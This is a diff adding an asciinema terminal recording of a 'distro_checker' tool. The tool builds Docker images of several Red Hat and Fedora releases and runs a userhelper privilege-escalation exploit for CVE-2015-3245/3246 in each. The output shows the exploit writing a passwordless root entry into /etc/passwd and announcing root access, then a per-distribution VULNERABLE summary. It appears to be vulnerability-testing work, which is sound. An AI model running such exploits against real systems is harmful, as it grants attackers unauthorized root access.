@@ -1,0 +1,1478 @@
+{
+  "version": 1,
+  "width": 115,
+  "height": 26,
+  "duration": 24.935945,
+  "command": "/bin/bash",
+  "title": "",
+  "env": {
+    "TERM": "xterm-256color",
+    "SHELL": "/bin/bash"
+  },
+  "stdout": [
+    [
+      0.063713,
+      "\u001b]0;root@kali: ~/dev/distro_checker\u0007\u001b[01;31mroot@kali\u001b[00m:\u001b[01;34m~/dev/distro_checker\u001b[00m# "
+    ],
+    [
+      0.683783,
+      "."
+    ],
+    [
+      0.000472,
+      "/"
+    ],
+    [
+      0.000170,
+      "d"
+    ],
+    [
+      0.000158,
+      "o"
+    ],
+    [
+      0.000121,
+      "c"
+    ],
+    [
+      0.000138,
+      "k"
+    ],
+    [
+      0.000147,
+      "e"
+    ],
+    [
+      0.000145,
+      "r"
+    ],
+    [
+      0.000603,
+      "_"
+    ],
+    [
+      0.000220,
+      "b"
+    ],
+    [
+      0.000220,
+      "u"
+    ],
+    [
+      0.000169,
+      "i"
+    ],
+    [
+      0.000152,
+      "l"
+    ],
+    [
+      0.000169,
+      "d"
+    ],
+    [
+      0.000194,
+      "."
+    ],
+    [
+      0.000186,
+      "p"
+    ],
+    [
+      0.000181,
+      "y"
+    ],
+    [
+      0.000162,
+      " "
+    ],
+    [
+      0.000204,
+      "-"
+    ],
+    [
+      0.000230,
+      "i"
+    ],
+    [
+      0.000163,
+      " "
+    ],
+    [
+      0.000140,
+      "r"
+    ],
+    [
+      0.000155,
+      "e"
+    ],
+    [
+      0.000162,
+      "d"
+    ],
+    [
+      0.000161,
+      "h"
+    ],
+    [
+      0.000156,
+      "a"
+    ],
+    [
+      0.000167,
+      "t"
+    ],
+    [
+      0.000163,
+      "_"
+    ],
+    [
+      0.000178,
+      "i"
+    ],
+    [
+      0.000166,
+      "m"
+    ],
+    [
+      0.000321,
+      "a"
+    ],
+    [
+      0.000214,
+      "g"
+    ],
+    [
+      0.000252,
+      "e"
+    ],
+    [
+      0.000190,
+      "s"
+    ],
+    [
+      0.000175,
+      "."
+    ],
+    [
+      0.000186,
+      "t"
+    ],
+    [
+      0.000150,
+      "x"
+    ],
+    [
+      0.000134,
+      "t"
+    ],
+    [
+      0.000133,
+      " "
+    ],
+    [
+      0.000133,
+      " "
+    ],
+    [
+      0.000133,
+      "-"
+    ],
+    [
+      0.000132,
+      "d"
+    ],
+    [
+      0.000133,
+      " "
+    ],
+    [
+      0.000132,
+      "e"
+    ],
+    [
+      0.000134,
+      "x"
+    ],
+    [
+      0.000142,
+      "t"
+    ],
+    [
+      0.000142,
+      "r"
+    ],
+    [
+      0.000134,
+      "a"
+    ],
+    [
+      0.000140,
+      "s"
+    ],
+    [
+      0.000140,
+      "/"
+    ],
+    [
+      0.000139,
+      "d"
+    ],
+    [
+      0.000186,
+      "o"
+    ],
+    [
+      0.000221,
+      "c"
+    ],
+    [
+      0.000186,
+      "k"
+    ],
+    [
+      0.000178,
+      "e"
+    ],
+    [
+      0.000147,
+      "r"
+    ],
+    [
+      0.000145,
+      "/"
+    ],
+    [
+      0.000138,
+      "D"
+    ],
+    [
+      0.000144,
+      "o"
+    ],
+    [
+      0.000139,
+      "c"
+    ],
+    [
+      0.000139,
+      "k"
+    ],
+    [
+      0.000138,
+      "e"
+    ],
+    [
+      0.000169,
+      "r"
+    ],
+    [
+      0.000149,
+      "f"
+    ],
+    [
+      0.000154,
+      "i"
+    ],
+    [
+      0.000133,
+      "l"
+    ],
+    [
+      0.000140,
+      "e"
+    ],
+    [
+      0.000147,
+      "."
+    ],
+    [
+      0.000152,
+      "r"
+    ],
+    [
+      0.000181,
+      "e"
+    ],
+    [
+      0.000151,
+      "d"
+    ],
+    [
+      0.000158,
+      "h"
+    ],
+    [
+      0.000141,
+      "a"
+    ],
+    [
+      0.000136,
+      "t"
+    ],
+    [
+      0.000135,
+      " "
+    ],
+    [
+      0.000141,
+      "-"
+    ],
+    [
+      0.000140,
+      "c"
+    ],
+    [
+      0.000141,
+      " "
+    ],
+    [
+      0.000135,
+      "i"
+    ],
+    [
+      0.000140,
+      "d"
+    ],
+    [
+      0.000141,
+      " "
+    ],
+    [
+      0.000140,
+      "|"
+    ],
+    [
+      0.000150,
+      "  \r"
+    ],
+    [
+      0.000120,
+      "t"
+    ],
+    [
+      0.000112,
+      "e"
+    ],
+    [
+      0.000106,
+      "e"
+    ],
+    [
+      0.000148,
+      " "
+    ],
+    [
+      0.000131,
+      "l"
+    ],
+    [
+      0.000106,
+      "o"
+    ],
+    [
+      0.000112,
+      "g"
+    ],
+    [
+      0.000109,
+      " "
+    ],
+    [
+      0.000106,
+      "2"
+    ],
+    [
+      0.000111,
+      "\u003e"
+    ],
+    [
+      0.000111,
+      " "
+    ],
+    [
+      0.000113,
+      "/"
+    ],
+    [
+      0.000112,
+      "d"
+    ],
+    [
+      0.000111,
+      "e"
+    ],
+    [
+      0.000110,
+      "v"
+    ],
+    [
+      0.000111,
+      "/"
+    ],
+    [
+      0.000112,
+      "n"
+    ],
+    [
+      0.000113,
+      "u"
+    ],
+    [
+      0.000108,
+      "l"
+    ],
+    [
+      0.000084,
+      "l"
+    ],
+    [
+      0.000039,
+      " "
+    ],
+    [
+      0.000037,
+      "\u0026"
+    ],
+    [
+      0.000031,
+      "\u0026"
+    ],
+    [
+      0.000038,
+      " "
+    ],
+    [
+      0.000031,
+      "p"
+    ],
+    [
+      0.000044,
+      "r"
+    ],
+    [
+      0.000031,
+      "i"
+    ],
+    [
+      0.000038,
+      "n"
+    ],
+    [
+      0.000032,
+      "t"
+    ],
+    [
+      0.000039,
+      "f"
+    ],
+    [
+      0.000032,
+      " "
+    ],
+    [
+      0.000039,
+      "\""
+    ],
+    [
+      0.000033,
+      "\\"
+    ],
+    [
+      0.000040,
+      "n"
+    ],
+    [
+      0.000033,
+      "S"
+    ],
+    [
+      0.000059,
+      "U"
+    ],
+    [
+      0.000081,
+      "M"
+    ],
+    [
+      0.000037,
+      "M"
+    ],
+    [
+      0.000060,
+      "A"
+    ],
+    [
+      0.000035,
+      "R"
+    ],
+    [
+      0.000041,
+      "Y"
+    ],
+    [
+      0.000034,
+      ":"
+    ],
+    [
+      0.000042,
+      "\\"
+    ],
+    [
+      0.000036,
+      "n"
+    ],
+    [
+      0.000042,
+      "="
+    ],
+    [
+      0.000052,
+      "="
+    ],
+    [
+      0.000038,
+      "="
+    ],
+    [
+      0.000034,
+      "="
+    ],
+    [
+      0.000042,
+      "="
+    ],
+    [
+      0.000039,
+      "="
+    ],
+    [
+      0.000145,
+      "="
+    ],
+    [
+      0.000242,
+      "="
+    ],
+    [
+      0.000057,
+      "="
+    ],
+    [
+      0.000038,
+      "="
+    ],
+    [
+      0.000045,
+      "\\"
+    ],
+    [
+      0.000037,
+      "n"
+    ],
+    [
+      0.000045,
+      "\""
+    ],
+    [
+      0.000043,
+      " "
+    ],
+    [
+      0.000042,
+      "\u0026"
+    ],
+    [
+      0.000045,
+      "\u0026"
+    ],
+    [
+      0.000040,
+      " "
+    ],
+    [
+      0.000046,
+      "c"
+    ],
+    [
+      0.000040,
+      "a"
+    ],
+    [
+      0.000046,
+      "t"
+    ],
+    [
+      0.000043,
+      " "
+    ],
+    [
+      0.000043,
+      "l"
+    ],
+    [
+      0.000047,
+      "o"
+    ],
+    [
+      0.000040,
+      "g"
+    ],
+    [
+      0.000048,
+      " "
+    ],
+    [
+      0.000040,
+      "|"
+    ],
+    [
+      0.000049,
+      " "
+    ],
+    [
+      0.000048,
+      "g"
+    ],
+    [
+      0.000042,
+      "r"
+    ],
+    [
+      0.000052,
+      "e"
+    ],
+    [
+      0.000053,
+      "p"
+    ],
+    [
+      0.000045,
+      " "
+    ],
+    [
+      0.000052,
+      "-"
+    ],
+    [
+      0.000053,
+      "E"
+    ],
+    [
+      0.000046,
+      " "
+    ],
+    [
+      0.000053,
+      "\""
+    ],
+    [
+      0.000054,
+      "\\"
+    ],
+    [
+      0.000131,
+      "("
+    ],
+    [
+      0.000078,
+      "3"
+    ],
+    [
+      0.000060,
+      "2"
+    ],
+    [
+      0.000073,
+      "4"
+    ],
+    [
+      0.000034,
+      "5"
+    ],
+    [
+      0.000090,
+      ","
+    ],
+    [
+      0.000038,
+      "3"
+    ],
+    [
+      0.000029,
+      "2"
+    ],
+    [
+      0.000034,
+      "4"
+    ],
+    [
+      0.000030,
+      "6"
+    ],
+    [
+      0.000065,
+      "\\"
+    ],
+    [
+      0.000042,
+      ")"
+    ],
+    [
+      0.000034,
+      ":"
+    ],
+    [
+      0.000036,
+      "|"
+    ],
+    [
+      0.000035,
+      "R"
+    ],
+    [
+      0.000033,
+      "e"
+    ],
+    [
+      0.000040,
+      "d"
+    ],
+    [
+      0.000035,
+      " "
+    ],
+    [
+      0.000037,
+      "H"
+    ],
+    [
+      0.000031,
+      "a"
+    ],
+    [
+      0.000036,
+      "t"
+    ],
+    [
+      0.000150,
+      "|"
+    ],
+    [
+      0.000046,
+      "F"
+    ],
+    [
+      0.000033,
+      "e"
+    ],
+    [
+      0.000044,
+      "d"
+    ],
+    [
+      0.000032,
+      "o"
+    ],
+    [
+      0.000038,
+      "r"
+    ],
+    [
+      0.000032,
+      "a"
+    ],
+    [
+      0.000037,
+      "\""
+    ],
+    [
+      0.000033,
+      " "
+    ],
+    [
+      0.000038,
+      "|"
+    ],
+    [
+      0.000034,
+      " "
+    ],
+    [
+      0.000039,
+      "g"
+    ],
+    [
+      0.000033,
+      "r \r"
+    ],
+    [
+      0.000023,
+      "e"
+    ],
+    [
+      0.000022,
+      "p"
+    ],
+    [
+      0.000019,
+      " "
+    ],
+    [
+      0.000019,
+      "-"
+    ],
+    [
+      0.000025,
+      "v"
+    ],
+    [
+      0.000020,
+      " "
+    ],
+    [
+      0.000020,
+      "R"
+    ],
+    [
+      0.000020,
+      "U"
+    ],
+    [
+      0.000025,
+      "N"
+    ],
+    [
+      2.125638,
+      "\r\n"
+    ],
+    [
+      0.042896,
+      "Sending build context to Docker daemon 226.3 kB\r"
+    ],
+    [
+      0.000357,
+      "\r\r\n"
+    ],
+    [
+      0.000335,
+      "Sending build context to Docker daemon \r\r\n"
+    ],
+    [
+      0.014524,
+      "Step 0 : FROM rhel6.5\r\n ---\u003e 17352558d512\r\nStep 1 : ADD . /tmp/\r\n"
+    ],
+    [
+      0.120704,
+      " ---\u003e 284f7b4b885f\r\n"
+    ],
+    [
+      0.013341,
+      "Removing intermediate container 9f3699d264b6\r\n"
+    ],
+    [
+      0.000469,
+      "Step 2 : WORKDIR /tmp/\r\n"
+    ],
+    [
+      0.012703,
+      " ---\u003e Running in 9e7c7fee8972\r\n"
+    ],
+    [
+      0.012814,
+      " ---\u003e f30afbb354d5\r\n"
+    ],
+    [
+      0.006958,
+      "Removing intermediate container 9e7c7fee8972\r\n"
+    ],
+    [
+      0.000482,
+      "Step 3 : RUN echo -e \"new_password\\nnew_password\" | (passwd --stdin nobody) \u0026\u0026 chsh -s /bin/bash nobody\r\n"
+    ],
+    [
+      0.012909,
+      " ---\u003e Running in 2b8ee3d2a9d1\r\n"
+    ],
+    [
+      0.089923,
+      "Changing password for user nobody.\r\npasswd: all authentication tokens updated successfully.\r\n"
+    ],
+    [
+      0.002617,
+      "Changing shell for nobody.\r\nShell changed.\r\n"
+    ],
+    [
+      0.051602,
+      " ---\u003e 7646addf4e7a\r\n"
+    ],
+    [
+      0.006379,
+      "Removing intermediate container 2b8ee3d2a9d1\r\n"
+    ],
+    [
+      0.000276,
+      "Step 4 : USER nobody\r\n"
+    ],
+    [
+      0.013887,
+      " ---\u003e Running in 9294c3d7b6c5\r\n"
+    ],
+    [
+      0.016560,
+      " ---\u003e 0bda116b829c\r\n"
+    ],
+    [
+      0.009129,
+      "Removing intermediate container 9294c3d7b6c5\r\n"
+    ],
+    [
+      0.000761,
+      "Step 5 : RUN ./roothelper_setpasswd ; exit 0\r\n"
+    ],
+    [
+      0.014869,
+      " ---\u003e Running in e4a6fe699538\r\n"
+    ],
+    [
+      0.511275,
+      "Creating a backup copy of \"/etc/passwd\" named \"/tmp/passwd-D4xBYD\"\r\nAttempting to add \"?::0:0::/:\" to \"/etc/passwd\"\r\nStarting and stopping userhelper #11\r\nStarting and stopping userhelper #10\r\nStarting and stopping userhelper #9\r\nStarting and stopping userhelper #8\r\nStarting and stopping userhelper #7\r\nStarting and stopping userhelper #6\r\nStarting and stopping userhelper #5\r\nStarting and stopping userhelper #4\r\nStarting and stopping userhelper #3\r\nStarting and stopping userhelper #2\r\nStarting and stopping userhelper #1\r\nStarting and stopping userhelper #0\r\nContinuing stopped userhelper #11\r\nContinuing stopped userhelper #10\r\nContinuing stopped userhelper #9\r\nContinuing stopped userhelper #8\r\nContinuing stopped userhelper #7\r\nContinuing stopped userhelper #6\r\nContinuing stopped userhelper #5\r\nContinuing stopped userhelper #4\r\nContinuing stopped userhelper #3\r\nContinuing stopped userhelper #2\r\nContinuing stopped userhelper #1\r\nContinuing stopped userhelper #0\r\nExploit successful, run \"su a\" to become root\r\n"
+    ],
+    [
+      0.063788,
+      " ---\u003e 3acbb1718bdc\r\n"
+    ],
+    [
+      0.016848,
+      "Removing intermediate container e4a6fe699538\r\n"
+    ],
+    [
+      0.002910,
+      "Step 6 : RUN cat /etc/redhat-release \u0026\u0026 grep -q 'a::0:0::/' /etc/passwd \u0026\u0026 printf \"CVE-2015-(3245,3246): \\033[31;1mVULNERABLE\\033[0m\\n\" || printf \"CVE-2015-(3245,3246): \\033[32;1mNot vulnerable\\033[0m\\n\"\r\n"
+    ],
+    [
+      0.012772,
+      " ---\u003e Running in f8c6def05db5\r\n"
+    ],
+    [
+      0.260937,
+      "Red Hat Enterprise Linux Server release 6.5 (Santiago)\r\n"
+    ],
+    [
+      0.001791,
+      "CVE-2015-(3245,3246): \u001b[31;1mVULNERABLE\u001b[0m\r\n"
+    ],
+    [
+      0.059344,
+      " ---\u003e 5c59496d474e\r\n"
+    ],
+    [
+      0.007794,
+      "Removing intermediate container f8c6def05db5\r\n"
+    ],
+    [
+      0.000425,
+      "Successfully built 5c59496d474e\r\n"
+    ],
+    [
+      0.037602,
+      "Error response from daemon: No command specified"
+    ],
+    [
+      0.000315,
+      "\r\n"
+    ],
+    [
+      0.005941,
+      "faraday container failed to start: \"Command 'docker run -d -t f216d91a-6b4e_rhel6.5' returned non-zero exit status 1\"\r\n"
+    ],
+    [
+      0.017774,
+      "Sending build context to Docker daemon 228.9 kB\r"
+    ],
+    [
+      0.000329,
+      "\r\r\n"
+    ],
+    [
+      0.000349,
+      "Sending build context to Docker daemon \r\r\n"
+    ],
+    [
+      0.021574,
+      "Step 0 : FROM rhel7.0\r\n ---\u003e 8e6704f39a3d\r\nStep 1 : ADD . /tmp/\r\n"
+    ],
+    [
+      0.142555,
+      " ---\u003e 42f56e8619fe\r\n"
+    ],
+    [
+      0.009173,
+      "Removing intermediate container 6a5d7f4e1ba3\r\n"
+    ],
+    [
+      0.000471,
+      "Step 2 : WORKDIR /tmp/\r\n"
+    ],
+    [
+      0.016865,
+      " ---\u003e Running in 6ab1bbf8e432\r\n"
+    ],
+    [
+      0.017705,
+      " ---\u003e 0ecb2debb57f\r\n"
+    ],
+    [
+      0.009208,
+      "Removing intermediate container 6ab1bbf8e432\r\n"
+    ],
+    [
+      0.001420,
+      "Step 3 : RUN echo -e \"new_password\\nnew_password\" | (passwd --stdin nobody) \u0026\u0026 chsh -s /bin/bash nobody\r\n"
+    ],
+    [
+      0.014815,
+      " ---\u003e Running in cf85e93a5b86\r\n"
+    ],
+    [
+      0.102129,
+      "Changing password for user nobody.\r\npasswd: all authentication tokens updated successfully.\r\n"
+    ],
+    [
+      0.031413,
+      "Changing shell for nobody.\r\nShell changed.\r\n"
+    ],
+    [
+      0.064636,
+      " ---\u003e 30727b6c4d56\r\n"
+    ],
+    [
+      0.008132,
+      "Removing intermediate container cf85e93a5b86\r\n"
+    ],
+    [
+      0.000546,
+      "Step 4 : USER nobody\r\n"
+    ],
+    [
+      0.013573,
+      " ---\u003e Running in a1648cd6ad23\r\n"
+    ],
+    [
+      0.013081,
+      " ---\u003e aec7a326c2e2\r\n"
+    ],
+    [
+      0.010450,
+      "Removing intermediate container a1648cd6ad23\r\n"
+    ],
+    [
+      0.000713,
+      "Step 5 : RUN ./roothelper_setpasswd ; exit 0\r\n"
+    ],
+    [
+      0.019443,
+      " ---\u003e Running in f6e607d41b35\r\n"
+    ],
+    [
+      0.552995,
+      "Creating a backup copy of \"/etc/passwd\" named \"/tmp/passwd-T1swXb\"\r\nAttempting to add \"?::0:0::/:\" to \"/etc/passwd\"\r\nStarting and stopping userhelper #11\r\nStarting and stopping userhelper #10\r\nStarting and stopping userhelper #9\r\nStarting and stopping userhelper #8\r\nStarting and stopping userhelper #7\r\nStarting and stopping userhelper #6\r\nStarting and stopping userhelper #5\r\nStarting and stopping userhelper #4\r\nStarting and stopping userhelper #3\r\nStarting and stopping userhelper #2\r\nStarting and stopping userhelper #1\r\nStarting and stopping userhelper #0\r\nContinuing stopped userhelper #11\r\nContinuing stopped userhelper #10\r\nContinuing stopped userhelper #9\r\nContinuing stopped userhelper #8\r\nContinuing stopped userhelper #7\r\nContinuing stopped userhelper #6\r\nContinuing stopped userhelper #5\r\nContinuing stopped userhelper #4\r\nContinuing stopped userhelper #3\r\nContinuing stopped userhelper #2\r\nContinuing stopped userhelper #1\r\nContinuing stopped userhelper #0\r\nExploit successful, run \"su a\" to become root\r\n"
+    ],
+    [
+      0.058273,
+      " ---\u003e 744ca8a15c53\r\n"
+    ],
+    [
+      0.007447,
+      "Removing intermediate container f6e607d41b35\r\n"
+    ],
+    [
+      0.000386,
+      "Step 6 : RUN cat /etc/redhat-release \u0026\u0026 grep -q 'a::0:0::/' /etc/passwd \u0026\u0026 printf \"CVE-2015-(3245,3246): \\033[31;1mVULNERABLE\\033[0m\\n\" || printf \"CVE-2015-(3245,3246): \\033[32;1mNot vulnerable\\033[0m\\n\"\r\n"
+    ],
+    [
+      0.016351,
+      " ---\u003e Running in d055299827ff\r\n"
+    ],
+    [
+      0.286729,
+      "Red Hat Enterprise Linux Server release 7.0 (Maipo)\r\n"
+    ],
+    [
+      0.002647,
+      "CVE-2015-(3245,3246): \u001b[31;1mVULNERABLE\u001b[0m\r\n"
+    ],
+    [
+      0.053787,
+      " ---\u003e 43d2fc9279e7\r\n"
+    ],
+    [
+      0.010147,
+      "Removing intermediate container d055299827ff\r\n"
+    ],
+    [
+      0.000457,
+      "Successfully built 43d2fc9279e7\r\n"
+    ],
+    [
+      0.035588,
+      "Error response from daemon: No command specified"
+    ],
+    [
+      0.000317,
+      "\r\n"
+    ],
+    [
+      0.002207,
+      "faraday container failed to start: \"Command 'docker run -d -t 68bde56c-52e1_rhel7.0' returned non-zero exit status 1\"\r\n"
+    ],
+    [
+      0.021009,
+      "Sending build context to Docker daemon 231.4 kB\r"
+    ],
+    [
+      0.000416,
+      "\r\r\n"
+    ],
+    [
+      0.000256,
+      "Sending build context to Docker daemon \r\r\n"
+    ],
+    [
+      0.014524,
+      "Step 0 : FROM rhel7.1\r\n ---\u003e e3c92c6cff35\r\nStep 1 : ADD . /tmp/\r\n"
+    ],
+    [
+      0.136980,
+      " ---\u003e 931b37b7d093\r\n"
+    ],
+    [
+      0.011344,
+      "Removing intermediate container 745b76471b85\r\n"
+    ],
+    [
+      0.000933,
+      "Step 2 : WORKDIR /tmp/\r\n"
+    ],
+    [
+      0.014191,
+      " ---\u003e Running in cee0d4574f0d\r\n"
+    ],
+    [
+      0.017731,
+      " ---\u003e 7da8160b0a89\r\n"
+    ],
+    [
+      0.011577,
+      "Removing intermediate container cee0d4574f0d\r\n"
+    ],
+    [
+      0.000495,
+      "Step 3 : RUN echo -e \"new_password\\nnew_password\" | (passwd --stdin nobody) \u0026\u0026 chsh -s /bin/bash nobody\r\n"
+    ],
+    [
+      0.016185,
+      " ---\u003e Running in 071ff3d0f29b\r\n"
+    ],
+    [
+      0.103800,
+      "Changing password for user nobody.\r\npasswd: all authentication tokens updated successfully.\r\n"
+    ],
+    [
+      0.032562,
+      "Changing shell for nobody.\r\nShell changed.\r\n"
+    ],
+    [
+      0.065603,
+      " ---\u003e 6441254379c4\r\n"
+    ],
+    [
+      0.007499,
+      "Removing intermediate container 071ff3d0f29b\r\n"
+    ],
+    [
+      0.000551,
+      "Step 4 : USER nobody\r\n"
+    ],
+    [
+      0.014284,
+      " ---\u003e Running in a4b770f92626\r\n"
+    ],
+    [
+      0.013631,
+      " ---\u003e 68319b43abc8\r\n"
+    ],
+    [
+      0.007123,
+      "Removing intermediate container a4b770f92626\r\n"
+    ],
+    [
+      0.000307,
+      "Step 5 : RUN ./roothelper_setpasswd ; exit 0\r\n"
+    ],
+    [
+      0.013367,
+      " ---\u003e Running in e8ae119ffa49\r\n"
+    ],
+    [
+      0.642704,
+      "Creating a backup copy of \"/etc/passwd\" named \"/tmp/passwd-eaqZhS\"\r\nAttempting to add \"?::0:0::/:\" to \"/etc/passwd\"\r\nStarting and stopping userhelper #11\r\nStarting and stopping userhelper #10\r\nStarting and stopping userhelper #9\r\nStarting and stopping userhelper #8\r\nStarting and stopping userhelper #7\r\nStarting and stopping userhelper #6\r\nStarting and stopping userhelper #5\r\nStarting and stopping userhelper #4\r\nStarting and stopping userhelper #3\r\nStarting and stopping userhelper #2\r\nStarting and stopping userhelper #1\r\nStarting and stopping userhelper #0\r\nContinuing stopped userhelper #11\r\nContinuing stopped userhelper #10\r\nContinuing stopped userhelper #9\r\nContinuing stopped userhelper #8\r\nContinuing stopped userhelper #7\r\nContinuing stopped userhelper #6\r\nContinuing stopped userhelper #5\r\nContinuing stopped userhelper #4\r\nContinuing stopped userhelper #3\r\nContinuing stopped userhelper #2\r\nContinuing stopped userhelper #1\r\nContinuing stopped userhelper #0\r\nExploit successful, run \"su a\" to become root\r\n"
+    ],
+    [
+      0.061564,
+      " ---\u003e 8a2233bbd896\r\n"
+    ],
+    [
+      0.006657,
+      "Removing intermediate container e8ae119ffa49\r\n"
+    ],
+    [
+      0.000398,
+      "Step 6 : RUN cat /etc/redhat-release \u0026\u0026 grep -q 'a::0:0::/' /etc/passwd \u0026\u0026 printf \"CVE-2015-(3245,3246): \\033[31;1mVULNERABLE\\033[0m\\n\" || printf \"CVE-2015-(3245,3246): \\033[32;1mNot vulnerable\\033[0m\\n\"\r\n"
+    ],
+    [
+      0.016259,
+      " ---\u003e Running in c8b6ef083ae3\r\n"
+    ],
+    [
+      0.275218,
+      "Red Hat Enterprise Linux Server release 7.1 (Maipo)\r\n"
+    ],
+    [
+      0.002016,
+      "CVE-2015-(3245,3246): \u001b[31;1mVULNERABLE\u001b[0m\r\n"
+    ],
+    [
+      0.061373,
+      " ---\u003e e31a7dd123ec\r\n"
+    ],
+    [
+      0.009436,
+      "Removing intermediate container c8b6ef083ae3\r\n"
+    ],
+    [
+      0.000377,
+      "Successfully built e31a7dd123ec\r\n"
+    ],
+    [
+      11.349861,
+      "['ssh', '-i', '/root/dev/distro_checker/extras/docker/faraday-docker.prv', '-t', '-t', '-oStrictHostKeyChecking=no', '-o UserKnownHostsFile=/dev/null', '-o LogLevel=quiet', '-X', u'root@172.17.1.102', 'id']\r\n"
+    ],
+    [
+      0.026717,
+      "Sending build context to Docker daemon   234 kB\r"
+    ],
+    [
+      0.000330,
+      "\r\r\n"
+    ],
+    [
+      0.000281,
+      "Sending build context to Docker daemon \r\r\n"
+    ],
+    [
+      0.019287,
+      "Step 0 : FROM fedora:20\r\n ---\u003e 1b48ab88a33e\r\nStep 1 : ADD . /tmp/\r\n"
+    ],
+    [
+      0.149648,
+      " ---\u003e bcdb653f2f81\r\n"
+    ],
+    [
+      0.008485,
+      "Removing intermediate container 5f7c7b2df5bf\r\n"
+    ],
+    [
+      0.000302,
+      "Step 2 : WORKDIR /tmp/\r\n"
+    ],
+    [
+      0.012423,
+      " ---\u003e Running in f57b82bc0734\r\n"
+    ],
+    [
+      0.012454,
+      " ---\u003e 1b51e00dfe77\r\n"
+    ],
+    [
+      0.006628,
+      "Removing intermediate container f57b82bc0734\r\n"
+    ],
+    [
+      0.000405,
+      "Step 3 : RUN echo -e \"new_password\\nnew_password\" | (passwd --stdin nobody) \u0026\u0026 chsh -s /bin/bash nobody\r\n"
+    ],
+    [
+      0.018616,
+      " ---\u003e Running in 984c7ade26ae\r\n"
+    ],
+    [
+      1.752986,
+      "Changing password for user nobody.\r\npasswd: all authentication tokens updated successfully.\r\n"
+    ],
+    [
+      0.031639,
+      "Changing shell for nobody.\r\nShell changed.\r\n"
+    ],
+    [
+      0.060814,
+      " ---\u003e b8182a8d40bb\r\n"
+    ],
+    [
+      0.008452,
+      "Removing intermediate container 984c7ade26ae\r\n"
+    ],
+    [
+      0.000608,
+      "Step 4 : USER nobody\r\n"
+    ],
+    [
+      0.013732,
+      " ---\u003e Running in f1b451b14301\r\n"
+    ],
+    [
+      0.013269,
+      " ---\u003e 3f3ec7f626d2\r\n"
+    ],
+    [
+      0.008131,
+      "Removing intermediate container f1b451b14301\r\n"
+    ],
+    [
+      0.000388,
+      "Step 5 : RUN ./roothelper_setpasswd ; exit 0\r\n"
+    ],
+    [
+      0.023557,
+      " ---\u003e Running in 672d0bdbcc16\r\n"
+    ],
+    [
+      0.230983,
+      "\u001b[91mdied in parent: roothelper.c:328: read_request\r\n\u001b[0m"
+    ],
+    [
+      0.061684,
+      " ---\u003e 7f6362ca98df\r\n"
+    ],
+    [
+      0.006674,
+      "Removing intermediate container 672d0bdbcc16\r\n"
+    ],
+    [
+      0.000424,
+      "Step 6 : RUN cat /etc/redhat-release \u0026\u0026 grep -q 'a::0:0::/' /etc/passwd \u0026\u0026 printf \"CVE-2015-(3245,3246): \\033[31;1mVULNERABLE\\033[0m\\n\" || printf \"CVE-2015-(3245,3246): \\033[32;1mNot vulnerable\\033[0m\\n\"\r\n"
+    ],
+    [
+      0.020540,
+      " ---\u003e Running in 70a63d64549d\r\n"
+    ],
+    [
+      0.267712,
+      "Fedora release 20 (Heisenbug)\r\nCVE-2015-(3245,3246): \u001b[32;1mNot vulnerable\u001b[0m\r\n"
+    ],
+    [
+      0.054178,
+      " ---\u003e 07cca6f3957d\r\n"
+    ],
+    [
+      0.012112,
+      "Removing intermediate container 70a63d64549d\r\n"
+    ],
+    [
+      0.000570,
+      "Successfully built 07cca6f3957d\r\n"
+    ],
+    [
+      0.031457,
+      "Error response from daemon: No command specified"
+    ],
+    [
+      0.000214,
+      "\r\n"
+    ],
+    [
+      0.002010,
+      "faraday container failed to start: \"Command 'docker run -d -t 89d46c2d-68d5_fedora:20' returned non-zero exit status 1\"\r\n"
+    ],
+    [
+      0.008636,
+      "Distros: ['rhel6.5', 'rhel7.0', 'rhel7.1', 'fedora:20']\r\nStart build docker: rhel6.5\r\ndocker build -f docker.tmp -t f216d91a-6b4e_rhel6.5.\r\nRun build docker: rhel6.5, id: f216d91a-6b4e_rhel6.5\r\n./docker_launcher.py -d -t f216d91a-6b4e_rhel6.5\r\n./docker_launcher.py -c 'id' -t f216d91a-6b4e_rhel6.5\r\nStart build docker: rhel7.0\r\ndocker build -f docker.tmp -t 68bde56c-52e1_rhel7.0.\r\nRun build docker: rhel7.0, id: 68bde56c-52e1_rhel7.0\r\n./docker_launcher.py -d -t 68bde56c-52e1_rhel7.0\r\n./docker_launcher.py -c 'id' -t 68bde56c-52e1_rhel7.0\r\nStart build docker: rhel7.1\r\ndocker build -f docker.tmp -t a64d3269-a752_rhel7.1.\r\nRun build docker: rhel7.1, id: a64d3269-a752_rhel7.1\r\n./docker_launcher.py -d -t a64d3269-a752_rhel7.1\r\n./docker_launcher.py -c 'id' -t a64d3269-a752_rhel7.1\r\nStart build docker: fedora:20\r\ndocker build -f docker.tmp -t 89d46c2d-68d5_fedora:20.\r\nRun build docker: fedora:20, id: 89d46c2d-68d5_fedora:20\r\n./docker_launcher.py -d -t 89d46c2d-68d5_fedora:20\r\n./docker_launcher.py -c 'id' -t 89d46c2d-68d5_fedora:20\r\n"
+    ],
+    [
+      0.001522,
+      "\r\nSUMMARY:\r\n==========\r\n"
+    ],
+    [
+      0.002705,
+      "Red Hat Enterprise Linux Server release 6.5 (Santiago)"
+    ],
+    [
+      0.000259,
+      "\r\n"
+    ],
+    [
+      0.000135,
+      "CVE-2015-(3245,3246): \u001b[31;1mVULNERABLE\u001b[0m"
+    ],
+    [
+      0.000099,
+      "\r\n"
+    ],
+    [
+      0.000115,
+      "Red Hat Enterprise Linux Server release 7.0 (Maipo)"
+    ],
+    [
+      0.000095,
+      "\r\n"
+    ],
+    [
+      0.000109,
+      "CVE-2015-(3245,3246): \u001b[31;1mVULNERABLE\u001b[0m"
+    ],
+    [
+      0.000094,
+      "\r\n"
+    ],
+    [
+      0.000108,
+      "Red Hat Enterprise Linux Server release 7.1 (Maipo)"
+    ],
+    [
+      0.000089,
+      "\r\n"
+    ],
+    [
+      0.000117,
+      "CVE-2015-(3245,3246): \u001b[31;1mVULNERABLE\u001b[0m"
+    ],
+    [
+      0.000095,
+      "\r\n"
+    ],
+    [
+      0.000109,
+      "Fedora release 20 (Heisenbug)"
+    ],
+    [
+      0.000090,
+      "\r\n"
+    ],
+    [
+      0.000108,
+      "CVE-2015-(3245,3246): \u001b[32;1mNot vulnerable\u001b[0m"
+    ],
+    [
+      0.000088,
+      "\r\n"
+    ],
+    [
+      0.000438,
+      "\u001b]0;root@kali: ~/dev/distro_checker\u0007\u001b[01;31mroot@kali\u001b[00m:\u001b[01;34m~/dev/distro_checker\u001b[00m# "
+    ],
+    [
+      3.269018,
+      "exit\r\n"
+    ]
+  ]
+}
